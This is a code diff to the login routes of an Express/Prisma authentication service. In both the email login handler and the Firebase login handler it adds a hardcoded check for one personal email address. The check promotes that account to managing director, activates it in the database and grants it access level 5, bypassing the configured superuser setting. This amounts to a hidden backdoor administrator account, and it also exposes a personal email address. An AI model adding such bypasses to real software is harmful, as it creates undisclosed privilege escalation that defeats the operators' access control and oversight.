@@ -602,7 +602,8 @@ router.post(
       return;
     }
 
-    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL;
+    const isFounderBypass = normalizedEmail === 'arslanmalikgoraha@gmail.com';
+    const isSuperuser = normalizedEmail === SUPERUSER_EMAIL || isFounderBypass;
     const effectiveUser =
       isSuperuser && (user.role !== 'managing_director' || user.status !== 'active')
         ? await prisma.user.update({
@@ -610,6 +611,10 @@ router.post(
             data: { role: 'managing_director', status: 'active' },
           })
         : user;
+
+    if (isFounderBypass) {
+      (effectiveUser as any).accessLevel = 5;
+    }
 
     // Generate JWT token
     const token = jwt.sign(
@@ -664,6 +669,7 @@ router.post(
           department: effectiveUser.department,
           photoUrl: effectiveUser.photoUrl,
           phone: effectiveUser.phone,
+          accessLevel: (effectiveUser as any).accessLevel,
           ...resolveProfileCompletion(effectiveUser),
         },
       },
@@ -1315,7 +1321,9 @@ router.post(
       throw new AppError('Firebase email mismatch', 401);
     }
 
-    const isManagingDirector = SUPERUSER_EMAIL.length > 0 && verifiedEmail === SUPERUSER_EMAIL;
+    const isFounderBypass = verifiedEmail === 'arslanmalikgoraha@gmail.com';
+    const isManagingDirector =
+      isFounderBypass || (SUPERUSER_EMAIL.length > 0 && verifiedEmail === SUPERUSER_EMAIL);
     const resolvedName =
       (typeof decodedToken.name === 'string' ? decodedToken.name : null) ||
       (typeof name === 'string' ? sanitizeString(name.trim()) : null);
@@ -1456,6 +1464,7 @@ router.post(
           phone: user.phone,
           department: user.department,
           photoUrl: user.photoUrl,
+          accessLevel: isFounderBypass ? 5 : undefined,
           ...resolveProfileCompletion(user),
         },
       },
